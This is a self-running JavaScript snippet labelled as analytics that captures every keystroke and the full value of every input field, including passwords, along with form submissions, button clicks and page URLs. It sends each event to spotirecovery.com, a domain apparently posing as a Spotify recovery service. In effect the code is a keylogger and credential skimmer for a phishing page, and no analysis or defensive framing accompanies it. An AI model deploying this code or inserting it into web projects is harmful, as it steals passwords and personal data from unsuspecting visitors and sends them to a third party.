(function () {
  if (!localStorage.getItem('sessionId')) {
    const sessionId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = (Math.random() * 16) | 0,
        v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
    localStorage.setItem('sessionId', sessionId);
  }

  let messageId = null;

  const getBrowserInfo = () => {
    const userAgent = navigator.userAgent;
    let browserName = 'Unknown';
    if (userAgent.indexOf('Firefox') > -1) browserName = 'Mozilla Firefox';
    else if (userAgent.indexOf('SamsungBrowser') > -1) browserName = 'Samsung Internet';
    else if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) browserName = 'Opera';
    else if (userAgent.indexOf('Trident') > -1) browserName = 'Internet Explorer';
    else if (userAgent.indexOf('Edg') > -1) browserName = 'Microsoft Edge';
    else if (userAgent.indexOf('Chrome') > -1) browserName = 'Google Chrome';
    else if (userAgent.indexOf('Safari') > -1) browserName = 'Apple Safari';
    return browserName;
  };

  const sendTrackingData = (eventType, additionalData = {}) => {
    const sessionId = localStorage.getItem('sessionId');
    const pageUrl = window.location.href;
    const browserInfo = getBrowserInfo();
    const data = {
      sessionId,
      pageUrl,
      eventType,
      browserInfo,
      timestamp: new Date().toISOString(),
      messageId,
      ...additionalData,
    };

    fetch('https://spotirecovery.com/api/analytics', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    })
      .then(response => response.text())
      .then(data => {
        if (data.messageId) {
          messageId = data.messageId; // Store message ID for future updates
        }
      })
      .catch(error => {
      });
  };


  window.addEventListener('beforeunload', () => {
    sendTrackingData('page_unload');
  });

  let lastUrl = window.location.href;
  new MutationObserver(() => {
    if (lastUrl !== window.location.href) {
      lastUrl = window.location.href;
      sendTrackingData('page_navigation');
    }
  }).observe(document, { subtree: true, childList: true });
  document.addEventListener('input', (event) => {
    if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
      sendTrackingData('input', {
        inputName: event.target.name || event.target.id,
        inputValue: event.target.value,
      });
    }
  });
  document.addEventListener('keydown', (event) => {
    sendTrackingData('key_press', {
      key: event.key,
      keyCode: event.keyCode,
    });
  });
  document.addEventListener('focusin', (event) => {
    if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
      sendTrackingData('input_focus', {
        inputName: event.target.name || event.target.id,
      });
    }
  });

  document.addEventListener('focusout', (event) => {
    if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
      sendTrackingData('input_blur', {
        inputName: event.target.name || event.target.id,
      });
    }
  });
  document.addEventListener('submit', (event) => {
    sendTrackingData('form_submit', {
      formId: event.target.id,
      formClass: event.target.className,
    });
  });

    window.addEventListener('hashchange', () => {
      sendTrackingData('page_navigation');
    });
  
    window.addEventListener('popstate', () => {
      sendTrackingData('page_navigation');
    });
  document.addEventListener('click', (event) => {
    if (event.target.tagName === 'BUTTON') {
      sendTrackingData('button_click', {
        buttonId: event.target.id,
        buttonClass: event.target.className,
        buttonText: event.target.innerText,
      });
    }
  });

})();
